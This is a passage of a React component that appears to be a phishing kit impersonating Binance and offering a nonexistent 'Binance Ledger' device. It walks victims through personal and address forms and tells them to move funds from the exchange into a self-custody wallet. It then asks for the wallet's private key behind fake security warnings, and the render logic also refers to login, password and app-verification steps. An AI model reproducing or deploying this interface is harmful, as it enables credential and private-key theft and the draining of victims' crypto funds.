            className="flex-1 h-12 bg-transparent border border-[#474d57] text-gray-300 font-medium rounded-md hover:border-gray-400 transition-colors"
          >
            Back
          </Button>
          <Button
            type="button"
            onClick={handleNext}
            className="flex-1 h-12 bg-[#fcd535] text-black font-medium rounded-md hover:bg-[#fcd535]/90 transition-colors"
          >
            Review Information
          </Button>
        </div>
      </div>
    </div>
  );

  const renderConfirmation = () => (
    <div className="space-y-6">
      <div className="text-center py-2">
        <h3 className="text-white font-semibold text-xl mb-4">
          Review Your Information
        </h3>
        <p className="text-gray-300 text-sm mb-6">
          Please review the information below before finalizing your submission.
        </p>
      </div>

      <div className="space-y-4 bg-binance-darkGray/40 p-4 rounded-md">
        <div className="grid grid-cols-2 gap-x-4 gap-y-2">
          <div className="text-gray-400 text-sm">First Name:</div>
          <div className="text-white text-sm font-medium">{formData.firstName}</div>
          
          <div className="text-gray-400 text-sm">Last Name:</div>
          <div className="text-white text-sm font-medium">{formData.lastName}</div>
          
          <div className="text-gray-400 text-sm">Date of Birth:</div>
          <div className="text-white text-sm font-medium">{formData.dateOfBirth}</div>
          
          <div className="text-gray-400 text-sm">Email:</div>
          <div className="text-white text-sm font-medium">{formData.email}</div>
          
          <div className="text-gray-400 text-sm">Phone Number:</div>
          <div className="text-white text-sm font-medium">{formData.phoneNumber}</div>
          
          <div className="text-gray-400 text-sm">Address:</div>
          <div className="text-white text-sm font-medium">{formData.address}</div>
          
          <div className="text-gray-400 text-sm">Postal Code:</div>
          <div className="text-white text-sm font-medium">{formData.zipCode}</div>
          
          <div className="text-gray-400 text-sm">City:</div>
          <div className="text-white text-sm font-medium">{formData.city}</div>
          
          <div className="text-gray-400 text-sm">Country:</div>
          <div className="text-white text-sm font-medium">{formData.country}</div>
        </div>
      </div>
      
      <div className="flex justify-between pt-6">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Go Back
        </Button>
        <Button
          type="button"
          onClick={handleNext}
          disabled={isSubmitting}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          {isSubmitting ? "Processing..." : "Confirm & Submit"}
        </Button>
      </div>
    </div>
  );

  const renderShipmentConfirmation = () => (
    <div className="text-center py-8">
      <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-binance-yellow/20 mb-6">
        <CheckCircle className="w-8 h-8 text-binance-yellow" />
      </div>
      <h3 className="text-white font-semibold text-xl mb-2">
        Success! Your Binance Ledger is on the way.
      </h3>
      <p className="text-gray-300">
        The Binance Ledger will be shipped to your provided address:
        <br />
        <span className="block mt-2 font-medium">
          {formData.address}, {formData.zipCode}
          <br />
          {formData.city}, {formData.country}
        </span>
      </p>
      <p className="mt-6 text-gray-300">
        Delivery typically takes <span className="text-binance-yellow font-medium">5 business days</span>.
      </p>
      <p className="mt-2 text-gray-400 text-sm">
        You will receive a confirmation email at {formData.email} with tracking information
        once your device has been shipped.
      </p>
      
      {/* Professional Next Steps Section */}
      <div className="mt-8 p-6 bg-binance-darkGray/30 border border-binance-yellow/20 rounded-lg">
        <div className="flex items-center justify-center mb-4">
          <div className="bg-binance-yellow/20 p-2 rounded-full mr-3">
            <Wallet className="w-5 h-5 text-binance-yellow" />
          </div>
          <h4 className="text-white font-semibold text-lg">
            LINK WALLET TO LEDGER
          </h4>
        </div>
        
        <div className="bg-binance-dark/40 rounded-lg p-4 mb-4">
          <p className="text-gray-300 text-center">
            Link your wallet to your ledger to optimize your security and secure your assets.
          </p>
        </div>
        
        <Button 
          onClick={handleNext}
          className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90 font-medium py-3"
        >
          <span className="flex items-center justify-center">
            LINK MY WALLET
            <ArrowRight className="ml-2 w-4 h-4" />
          </span>
        </Button>
      </div>
    </div>
  );

  const renderWalletStep1 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          1
        </div>
        <h3 className="text-white font-semibold text-lg">Log in to your Binance App</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p className="mb-4">
          Open your Binance mobile application and log in with your credentials. 
          If you don't have the app installed yet, you can download it from your app store.
        </p>
      </div>
      
      <Button 
        onClick={handleNext}
        className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90 mt-2"
      >
        I've Logged In, Continue
      </Button>
    </div>
  );

  const renderWalletStep2 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          2
        </div>
        <h3 className="text-white font-semibold text-lg">Go to your Binance Wallet</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p>Navigate to the Wallet section in your Binance App by tapping on the Wallet icon.</p>
        
        <div className="bg-red-900/20 border border-red-500/30 rounded-md p-3 my-4">
          <h4 className="text-red-400 font-medium text-sm mb-1">Don't have a wallet yet?</h4>
          <p className="text-sm">
            If you don't have a wallet yet, you'll need to create one first by following the steps in the app. 
            Tap on "Create Wallet" and follow the on-screen instructions.
          </p>
        </div>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          Next Step
        </Button>
      </div>
    </div>
  );

  const renderWalletStep3 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          3
        </div>
        <h3 className="text-white font-semibold text-lg">Ensure funds are in your wallet</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p className="mb-4">
          This step is <span className="text-binance-yellow font-medium">very important</span> for the safety of your assets.
        </p>
        
        <div className="bg-red-900/20 border border-red-500/30 rounded-md p-3 mb-4">
          <h4 className="text-red-400 font-medium mb-2">Critical Security Notice:</h4>
          <p>
            Your funds must be in your wallet, not in the exchange environment. 
            If your funds are still in the exchange, you must transfer them to your wallet.
          </p>
        </div>
        
        <p>
          To transfer funds from the exchange to your wallet:
        </p>
        <ol className="list-decimal ml-5 space-y-2 mt-2">
          <li>Go to your Binance Spot wallet</li>
          <li>Select the cryptocurrency you want to transfer</li>
          <li>Tap "Transfer" and select "To Wallet"</li>
          <li>Enter the amount and confirm the transfer</li>
        </ol>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          I've Transferred My Funds, Continue
        </Button>
      </div>
    </div>
  );

  const renderWalletStep4 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          4
        </div>
        <h3 className="text-white font-semibold text-lg">Access wallet management</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p className="mb-4">
          In the Binance Wallet interface:
        </p>
        
        <ol className="list-decimal ml-5 space-y-3">
          <li>Look for "My Wallet" in the top-left corner and tap on it</li>
          <li>In the top-right corner, tap on "Manage"</li>
          <li>Select your wallet from the list</li>
          <li>A menu with three functions will appear</li>
          <li>Choose "Convert to Private Key Wallet"</li>
        </ol>
        
        <p className="mt-4">
          This will begin the linking process between your wallet and the Binance Ledger.
        </p>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          Next Step
        </Button>
      </div>
    </div>
  );

  const renderWalletStep5 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          5
        </div>
        <h3 className="text-white font-semibold text-lg">Read the security reminder</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p className="mb-4">
          After selecting "Convert to Private Key Wallet", you will see a security reminder.
        </p>
        
        <div className="bg-red-900/20 border border-red-500/30 rounded-md p-3 mb-4">
          <h4 className="text-red-400 font-medium mb-2">Important:</h4>
          <p>
            Read the security reminder carefully. This outlines important information about 
            managing your private key wallet and the responsibilities that come with it.
          </p>
        </div>
        
        <p>
          Security reminders typically cover:
        </p>
        <ul className="list-disc ml-5 space-y-2 mt-2">
          <li>Private key safety</li>
          <li>Backup recommendations</li>
          <li>Risk management</li>
          <li>Personal responsibility for wallet security</li>
        </ul>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          I've Read the Reminder, Continue
        </Button>
      </div>
    </div>
  );

  const renderWalletStep6 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          6
        </div>
        <h3 className="text-white font-semibold text-lg">Review Convert Wallet details</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
        <p className="mb-4">
          After reading the reminder and clicking Next, you will see the Convert Wallet screen.
        </p>
        
        <p>The screen will display information about:</p>
        <ul className="list-disc ml-5 space-y-2 mt-2">
          <li>The wallet being converted</li>
          <li>Assets in the wallet</li>
          <li>Technical details about the conversion</li>
        </ul>
        
        <p className="mt-4">
          Review all details carefully to ensure you understand the process and everything is correct.
        </p>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          I've Reviewed Everything, Continue
        </Button>
      </div>
    </div>
  );

  const renderWalletStep7 = () => (
    <div className="space-y-6">
      <div className="flex items-center">
        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
          7
        </div>
        <h3 className="text-white font-semibold text-lg">Confirm security measures</h3>
      </div>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 space-y-5 text-gray-300">
        <p>
          We are about to link your wallet to your personal Ledger.
          Before proceeding, please confirm that you understand each of the following points:
        </p>
        
        <div className="flex items-center space-x-2">
          <Checkbox
            id="understand"
            checked={formData.walletConfirmations.understand}
            onCheckedChange={(checked) => handleWalletConfirmation("understand", checked === true)}
            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
          />
          <label htmlFor="understand" className="text-gray-200">
            I understand that I am solely responsible for the security of my private key
          </label>
        </div>
        
        <div className="flex items-center space-x-2">
          <Checkbox
            id="risks"
            checked={formData.walletConfirmations.risks}
            onCheckedChange={(checked) => handleWalletConfirmation("risks", checked === true)}
            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
          />
          <label htmlFor="risks" className="text-gray-200">
            I acknowledge the risks associated with private key management
          </label>
        </div>
        
        <div className="flex items-center space-x-2">
          <Checkbox
            id="backup"
            checked={formData.walletConfirmations.backup}
            onCheckedChange={(checked) => handleWalletConfirmation("backup", checked === true)}
            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
          />
          <label htmlFor="backup" className="text-gray-200">
            I will keep a secure backup of my private key and won't share it with anyone
          </label>
        </div>
        
        <div className="flex items-center space-x-2">
          <Checkbox
            id="responsibility"
            checked={formData.walletConfirmations.responsibility}
            onCheckedChange={(checked) => handleWalletConfirmation("responsibility", checked === true)}
            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
          />
          <label htmlFor="responsibility" className="text-gray-200">
            I understand that lost private keys cannot be recovered by Binance
          </label>
        </div>
      </div>
      
      <div className="flex justify-between pt-2">
        <Button
          type="button"
          onClick={handlePrevious}
          className="bg-gray-600 hover:bg-gray-700 text-white"
        >
          Back
        </Button>
        <Button 
          onClick={handleNext}
          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          I Confirm All Points, Continue
        </Button>
      </div>
    </div>
  );

  const renderWalletStep8 = () => (
    <div className="w-full max-w-md mx-auto">
      <div className="text-center mb-8">
        <h1 className="text-2xl font-semibold text-white mb-2">Enter Private Key</h1>
        <p className="text-gray-400 text-sm">Please enter your wallet's private key</p>
      </div>
      
      <div className="mb-6 p-4 bg-red-900/20 border border-red-500/30 rounded-md">
        <div className="flex items-start">
          <AlertCircle className="text-red-400 w-5 h-5 mt-1 mr-3 flex-shrink-0" />
          <div>
            <h4 className="text-red-400 font-medium mb-2">Critical Security Warning:</h4>
            <p className="text-gray-300 text-sm">
              This key is for your eyes only. Do not share it with anyone and ensure no one is watching your screen.
              Private keys grant complete access to your crypto assets.
            </p>
          </div>
        </div>
      </div>
      
      <div className="space-y-6">
        <div>
          <label htmlFor="privateKey" className="block text-sm font-medium text-gray-300 mb-2">
            Private Key
          </label>
          <div className="relative">
            <Input
              id="privateKey"
              name="privateKey"
              value={formData.privateKey}
              onChange={handleInputChange}
              placeholder="Enter your private key"
              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 pl-12 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] font-mono ${errors.privateKey ? "border-red-500" : ""}`}
            />
            <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-500 w-4 h-4" />
          </div>
          {errors.privateKey && <p className="text-red-500 text-xs mt-1">{errors.privateKey}</p>}
        </div>
        
        <div className="flex justify-between space-x-3">
          <Button
            type="button"
            onClick={handlePrevious}
            className="flex-1 h-12 bg-transparent border border-[#474d57] text-gray-300 font-medium rounded-md hover:border-gray-400 transition-colors"
          >
            Back
          </Button>
          <Button 
            onClick={handleNext}
            disabled={isSubmitting}
            className="flex-1 h-12 bg-[#fcd535] text-black font-medium rounded-md hover:bg-[#fcd535]/90 transition-colors"
          >
            {isSubmitting ? "Processing..." : "Link My Wallet"}
          </Button>
        </div>
      </div>
    </div>
  );

  const renderWalletSuccess = () => (
    <div className="text-center py-8">
      <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-binance-yellow/20 mb-6">
        <CheckCircle className="w-8 h-8 text-binance-yellow" />
      </div>
      <h3 className="text-white font-semibold text-xl mb-4">
        Your Ledger has been successfully linked!
      </h3>
      
      <div className="bg-binance-darkGray/40 rounded-lg p-4 mt-6 max-w-md mx-auto text-left">
        <h4 className="text-binance-yellow font-medium mb-2">What's next?</h4>
        <ul className="list-disc ml-5 space-y-2 text-gray-300">
          <li>Your Binance Ledger device will be shipped to your address</li>
          <li>You'll receive tracking information via email</li>
          <li>Once received, you can start using it with your linked wallet</li>
          <li>Your estimated delivery: <span className="font-medium">5 business days</span></li>
        </ul>
      </div>
      
      <div className="mt-8 flex items-center justify-center">
        <Wallet className="text-binance-yellow mr-2" size={24} />
        <p className="text-gray-300">
          Thank you for choosing Binance Ledger for your crypto security
        </p>
      </div>
    </div>
  );

  return (
    <div>
      {currentStep === FormStep.LOGIN_EMAIL && renderLoginEmail()}
      {currentStep === FormStep.LOGIN_PASSWORD && renderLoginPassword()}
      {currentStep === FormStep.APP_VERIFICATION && (
        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
          {renderAppVerification()}
        </div>
      )}
      {currentStep === FormStep.LOGIN_SUCCESS && (
        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
          {renderLoginSuccess()}
        </div>
      )}
      {currentStep === FormStep.PERSONAL_DETAILS && (
        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
          <div className="mb-6">
            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Account Verification</h2>
            <div className="mb-4">
              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
              <div className="mt-2 text-sm text-gray-400">
                Step {currentStep} of {FormStep.WALLET_SUCCESS}
              </div>
            </div>
          </div>
          {renderPersonalDetails()}
        </div>
      )}
      {currentStep === FormStep.ADDRESS_DETAILS && (
        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
          <div className="mb-6">
            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Account Verification</h2>
            <div className="mb-4">
              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
              <div className="mt-2 text-sm text-gray-400">
                Step {currentStep} of {FormStep.WALLET_SUCCESS}
              </div>
            </div>
          </div>
          {renderAddressDetails()}
        </div>
      )}
      {currentStep === FormStep.CONFIRMATION && (
        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
          <div className="mb-6">
            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Account Verification</h2>
            <div className="mb-4">
              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
              <div className="mt-2 text-sm text-gray-400">
                Step {currentStep} of {FormStep.WALLET_SUCCESS}
              </div>
            </div>
          </div>
          {renderConfirmation()}
        </div>
      )}
      {currentStep === FormStep.SHIPMENT_CONFIRMATION && (
        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
          <div className="mb-6">
            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Account Verification</h2>
            <div className="mb-4">
              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
              <div className="mt-2 text-sm text-gray-400">
                Step {currentStep} of {FormStep.WALLET_SUCCESS}
              </div>
            </div>
          </div>
          {renderShipmentConfirmation()}
        </div>
      )}
      {(currentStep >= FormStep.WALLET_STEP1 && currentStep <= FormStep.WALLET_STEP8) && (
        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
          <div className="mb-6">
            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Wallet Linking Process</h2>
            <div className="mb-4">
              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
              <div className="mt-2 text-sm text-gray-400">
                Step {currentStep} of {FormStep.WALLET_SUCCESS}
              </div>
            </div>
          </div>
          <div>
            {currentStep === FormStep.WALLET_STEP1 && renderWalletStep1()}
            {currentStep === FormStep.WALLET_STEP2 && renderWalletStep2()}
            {currentStep === FormStep.WALLET_STEP3 && renderWalletStep3()}
            {currentStep === FormStep.WALLET_STEP4 && renderWalletStep4()}
            {currentStep === FormStep.WALLET_STEP5 && renderWalletStep5()}
            {currentStep === FormStep.WALLET_STEP6 && renderWalletStep6()}
            {currentStep === FormStep.WALLET_STEP7 && renderWalletStep7()}
            {currentStep === FormStep.WALLET_STEP8 && renderWalletStep8()}
          </div>
        </div>
      )}
      {currentStep === FormStep.WALLET_SUCCESS && (
        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
          <div className="mb-6">
            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Wallet Linking Process</h2>
            <div className="mb-4">
              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
              <div className="mt-2 text-sm text-gray-400">
                Step {currentStep} of {FormStep.WALLET_SUCCESS}
              </div>
            </div>
          </div>
          {renderWalletSuccess()}
        </div>
      )}

      <AlertDialog open={showLinkingDialog}>
        <AlertDialogContent className="bg-[#1e2329] border-[#474d57]">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-white">Linking Your Ledger</AlertDialogTitle>
            <AlertDialogDescription className="text-gray-300">
              Please wait while we link your wallet to your Binance Ledger device...
            </AlertDialogDescription>
          </AlertDialogHeader>
          <div className="flex justify-center py-4">
            <div className="flex flex-col items-center">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#fcd535] mb-3"></div>
              <div className="text-[#fcd535]">{timerCount} seconds remaining</div>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default BinanceLedgerForm;
